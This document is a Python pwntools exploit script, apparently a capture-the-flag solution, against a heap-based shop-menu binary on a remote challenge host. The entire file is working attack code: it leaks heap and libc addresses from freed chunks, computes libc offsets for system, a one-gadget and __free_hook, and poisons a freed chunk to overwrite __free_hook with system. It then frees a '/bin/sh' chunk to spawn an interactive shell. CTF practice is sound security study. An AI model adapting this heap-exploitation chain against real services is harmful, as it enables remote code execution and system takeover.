from pwn import *

r = remote("challenge.ctf.games", 30195)
#r = process("./pawned")
#gdb.attach(r)




def buy(index):
	r.sendline(b'b')
	r.recvuntil(b'What item would you like to buy?:')
	#print(r.recvuntil(b'What item would you like to buy?:'))
	r.sendline(str(index).encode("utf-8"))
	r.recvuntil(b'>')

def sell(price, lenght, name):
	r.sendline(b's')
	r.recvuntil(b'Enter item price:')
	r.sendline(str(price).encode("utf-8"))
	r.recvuntil(b'Enter length of the item name:')
	r.sendline(str(lenght).encode("utf-8"))
	r.recvuntil(b'Enter the name of the item:')
	r.sendline(name)
	r.recvuntil(b'>')


def manager(index, lenght, name):
	r.sendline(b'm')
	r.recvuntil(b'What item would you like to change?:')
	r.sendline(str(index).encode("utf-8"))
	r.recvuntil(b'Enter the new item price:')
	r.send(b"\x00")
	r.recvuntil(b'Enter the new item name length:')
	r.sendline(str(lenght).encode("utf-8"))
	r.recvuntil(b'Enter the new name of the item:')
	r.sendline(name)
	r.recvuntil(b'>')


def printitem():
	r.sendline(b'p')
	stuff = r.recvuntil(b'>')
	return stuff


sell(100, 0x50, "11111111")
sell(200, 0x50, "22222222")
buy(1)
buy(2)
stuff = printitem().split(b'\n\n')[0][-6:]
heap_addr = int.from_bytes(stuff, "little")
print(hex(heap_addr))

sell(100, 0x500, "11111111")
sell(200, 0x500, "22222222")
buy(3)
buy(4)
stuff = printitem().split(b'\n3.')[0][-6:]
libc_addr = int.from_bytes(stuff, "little")

malloc_hook_off = 0x00000000001ebb70

libc_base = libc_addr - 96 - 16 - malloc_hook_off
print(hex(libc_base))


onegadget_off = 0xe6c81
onegadget_addr = libc_base + onegadget_off

target = libc_base + malloc_hook_off - 0x20 + 5 - 8
payload = b"\x00"*3 + p64(0)*4 + p64(onegadget_addr)
#print(hex(onegadget_addr))

binsh_off = 0x1b75aa
binsh_addr = libc_base + binsh_off

system_off = 0x000000000055410

free_hook_off = 0x00000000001eeb28
target = libc_base + free_hook_off - 0x20 + 5 - 8
payload = b"\x00"*3 + p64(0)*4 + p64(libc_base + system_off)
#payload = b"\x00"*3 + p64(0)*4 + p64(onegadget_addr)
print(hex(libc_base + system_off))

sell(100, 0x68, "123")
sell(200, 0x68, "123")
buy(5)
buy(6)
manager(6, 0x68, p64(target) )

sell(0x68, 0x68, b"/bin/sh\x00")
sell(300, 0x68, payload)
#sell(1, 0x68, "123")
#manager(7, p64(binsh_addr), p64(target) )

#buy(7)

r.sendline(b'b')
r.recvuntil(b'What item would you like to buy?:')
#print(r.recvuntil(b'What item would you like to buy?:'))
r.sendline(str(7).encode("utf-8"))
r.recv()



r.interactive()